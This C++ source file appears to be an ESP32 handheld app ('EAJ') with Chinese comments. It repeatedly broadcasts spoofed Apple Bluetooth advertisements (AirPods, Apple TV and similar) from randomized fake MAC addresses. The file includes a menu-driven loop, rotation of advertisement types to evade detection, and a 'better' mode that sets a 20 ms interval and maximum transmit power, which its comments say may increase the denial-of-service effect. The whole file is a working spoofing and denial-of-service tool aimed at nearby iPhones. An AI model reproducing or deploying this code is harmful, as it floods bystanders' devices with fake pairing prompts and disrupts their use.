#if 1
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include "App_EAJ.h"
#include "../../../ChappieBsp/Chappie.h"
#include "devices.h"

#define VERSION_BUILD_TIME    __DATE__ "-" __TIME__
void Status_update(lv_timer_t * timer);

static std::string app_name = "EAJ";
static CHAPPIE* device;

LV_IMG_DECLARE(ui_img_icon_EAJ_png);

static lv_obj_t * switch1;
static lv_obj_t * switch2;
static lv_obj_t * switch3;
static lv_obj_t * big_button;
static lv_obj_t * delay_slider;
static lv_obj_t * delay_label;
static lv_obj_t * button_label;
BLEAdvertising *pAdvertising;
uint32_t delayMilliseconds = 1000;
static bool buttonState = true;
static int device_long = 1;
static int device_short = 1;
static int stronger = 0;
static int running = 1; // 全局变量，控制任务循环

void EAJ_start() {
  // 首先生成虚假的随机MAC地址
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

  // 似乎由于某种原因，前4位需要是高位（即0b1111），因此我们用0xF0进行OR运算。
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // 随机选择设备数据
  // 0 = long (耳机), 1 = short (杂项，例如Apple TV)
  if (device_long == device_short){
    int device_choice = random(2);
    if (device_choice == 0){
        int index = random(17);
        oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
    } else {
        int index = random(12);
        oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
    }
  } else {
    if (device_long == 1){
        int index = random(17);
        oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
    } else {
        int index = random(12);
        oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
    }
  }

  /* 苹果的《Apple设备附件设计指南（发布版本R20）》第191页建议在连接到Apple设备时仅使用三种广播PDU类型之一。
      // 0 = ADV_TYPE_IND, 
      // 1 = ADV_TYPE_SCAN_IND
      // 2 = ADV_TYPE_NONCONN_IND
      
      随机使用这些PDU类型之一可能会增加欺骗数据包的检测性。

      我们确定的信息：
      - AirPods第2代：当盖子打开时广播ADV_TYPE_SCAN_IND数据包，并在配对模式下（按住后盖按钮时）广播ADV_TYPE_NONCONN_IND。
                        如果要专门针对AirPods第2代，请考虑仅使用这些PDU类型。
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // 设置设备地址，广播数据
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // 设置广告间隔
  /* 根据苹果的技术Q&A QA1931（https://developer.apple.com/library/archive/qa/qa1931/_index.html），苹果建议
        对于希望最大化其BLE配件被iOS发现的开发人员，使用广告间隔为20毫秒。
        
        这些代码行将间隔固定为20毫秒。启用这些可能会增加DoS的效果。请注意，这尚未经过彻底测试。
  */
    if (stronger == 1){
        pAdvertising->setMinInterval(0x20);
        pAdvertising->setMaxInterval(0x20);
        pAdvertising->setMinPreferred(0x20);
        pAdvertising->setMaxPreferred(0x20);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P21);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
    }
    // 开始广播
    Serial.println("Sending Advertisement...");
    // 在“繁忙”部分打开灯光
    FastLED.showColor(CRGB::Blue, 5);
    pAdvertising->start();
        
    delay(delayMilliseconds); // 延迟
    pAdvertising->stop();
    // 在休眠的时候关灯
    FastLED.showColor(CRGB::Black);
}

void EAJ_start_task(void * pvParameters) {
    while(running) { // 使用变量控制循环
        EAJ_start();
        vTaskDelay(1 / portTICK_PERIOD_MS); // 短暂延时以避免占用太多CPU时间
    }
    vTaskDelete(NULL); // 结束任务
}

static void event_handler(lv_event_t * e) {
    lv_obj_t * obj = lv_event_get_target(e);

    if (obj == switch1) {
            if (lv_obj_has_state(switch1, LV_STATE_CHECKED)) {
                device_long = 1;
            } else {
                device_long = 0;
            }
        } else if (obj == switch2) {
            if (lv_obj_has_state(switch2, LV_STATE_CHECKED)) {
                device_short = 1;
            } else {
                device_short = 0;
            }
        } else if (obj == switch3) {
            if (lv_obj_has_state(switch3, LV_STATE_CHECKED)) {
                stronger = 1;
            } else {
                stronger = 0;
            }
        }

    if (buttonState) {
        lv_label_set_text(button_label, "stop");
        //delay(1000);
        // 执行 start 相关的操作
        running = 1;
        xTaskCreate(
            EAJ_start_task, /* 任务函数 */
            "EAJStartTask", /* 任务名称，用于调试 */
            10000,          /* 栈大小 */
            NULL,           /* 传递给任务函数的参数 */
            1,              /* 任务优先级 */
            NULL            /* 任务句柄 */
        );
    } else {
        lv_label_set_text(button_label, "start");
        // 执行 stop 相关的操作
        running = 0;
        delay(delayMilliseconds); // 延迟
        // 在休眠的时候关灯
        FastLED.showColor(CRGB::Black);
        pAdvertising->stop();
    }
    buttonState = !buttonState;
}

static void slider_event_cb(lv_event_t * e) {
    lv_obj_t * slider = lv_event_get_target(e);
    delayMilliseconds = lv_slider_get_value(slider);
    char buf[16];
    snprintf(buf, 16, "Delay: %d ms", delayMilliseconds);
    lv_label_set_text(delay_label, buf);
}

void my_lvgl_interface(void) {
    /* 创建三个开关 */
    switch1 = lv_switch_create(lv_scr_act());
    lv_obj_add_state(switch1, LV_STATE_CHECKED); // 默认开启
    lv_obj_align(switch1, LV_ALIGN_TOP_MID, -60, 20);
    lv_obj_t * label1 = lv_label_create(lv_scr_act());
    lv_label_set_text(label1, "head");
    lv_obj_align_to(label1, switch1, LV_ALIGN_OUT_TOP_MID, 0, 0);

    switch2 = lv_switch_create(lv_scr_act());
    lv_obj_add_state(switch2, LV_STATE_CHECKED); // 默认开启
    lv_obj_align(switch2, LV_ALIGN_TOP_MID, 0, 20);
    lv_obj_t * label2 = lv_label_create(lv_scr_act());
    lv_label_set_text(label2, "misc");
    lv_obj_align_to(label2, switch2, LV_ALIGN_OUT_TOP_MID, 0, 0);

    switch3 = lv_switch_create(lv_scr_act());
    // switch3 默认关闭
    lv_obj_align(switch3, LV_ALIGN_TOP_MID, 60, 20);
    lv_obj_t * label3 = lv_label_create(lv_scr_act());
    lv_label_set_text(label3, "better");
    lv_obj_align_to(label3, switch3, LV_ALIGN_OUT_TOP_MID, 0, 0);

    /* 创建中间的大按钮 */
    big_button = lv_btn_create(lv_scr_act());
    lv_obj_set_size(big_button, 200, 50);
    lv_obj_align(big_button, LV_ALIGN_CENTER, 0, 0);
    lv_obj_add_event_cb(big_button, event_handler, LV_EVENT_CLICKED, NULL);
    lv_obj_add_flag(big_button, LV_OBJ_FLAG_CHECKABLE);

    button_label = lv_label_create(big_button);
    lv_label_set_text(button_label, "start");
    lv_obj_align_to(button_label, big_button, LV_ALIGN_CENTER, 0, 0);


    /* 创建底部的滑动条 */
    delay_slider = lv_slider_create(lv_scr_act());
    lv_slider_set_range(delay_slider, 100, 1000); // 假设延迟范围从0到1000毫秒
    lv_slider_set_value(delay_slider, 1000, LV_ANIM_OFF);
    lv_obj_set_width(delay_slider, 200);
    lv_obj_align(delay_slider, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_add_event_cb(delay_slider, slider_event_cb, LV_EVENT_VALUE_CHANGED, NULL);

    delay_label = lv_label_create(lv_scr_act());
    char buf[16];
    snprintf(buf, 16, "Delay: %d ms", delayMilliseconds);
    lv_label_set_text(delay_label, buf);
    lv_obj_align_to(delay_label, delay_slider, LV_ALIGN_OUT_TOP_MID, 0, -10);

}

void EAJ_create(void)
{
    lv_timer_handler();
    Serial.begin(115200);
    Serial.println("Starting ESP32 BLE");

    BLEDevice::init("AirPods 69");

    // 创建BLE服务器
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();

    // 似乎我们需要在setup()步骤中用一个地址初始化它。
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);

}

namespace App {
    /**
     * @brief Return the App name laucnher, which will be show on launcher App list
     * 
     * @return std::string 
     */
    std::string App_EAJ_appName()
    {
        return app_name;
    }


    /**
     * @brief Return the App Icon laucnher, NULL for default
     * 
     * @return void* 
     */
    void* App_EAJ_appIcon()
    {
        return (void*) &ui_img_icon_EAJ_png;
        // return NULL;
    }


    /**
     * @brief Called when App is on create
     * 
     */
    void App_EAJ_onCreate()
    {
        UI_LOG("[%s] onCreate\n", App_EAJ_appName().c_str());
        FastLED.showColor(CRGB::Orange, 5);
        EAJ_create();
        my_lvgl_interface();
    }


    /**
     * @brief Called repeatedly, end this function ASAP! or the App management will be affected
     * If the thing you want to do takes time, try create a taak or lvgl timer to handle them.
     * Try use millis() instead of delay() here
     * 
     */
    void App_EAJ_onLoop()
    {
    }


    /**
     * @brief Called when App is about to be destroy
     * Please remember to release the resourse like lvgl timers in this function
     * 
     */
    void App_EAJ_onDestroy()
    {
        UI_LOG("[%s] onDestroy\n", App_EAJ_appName().c_str());
        FastLED.showColor(CRGB::Black);
    }


    /**
     * @brief Launcher will pass the BSP pointer through this function before onCreate
     * 
     */
    void App_EAJ_getBsp(void* bsp)
    {
        device = (CHAPPIE*)bsp;
    }
    
}

#endif
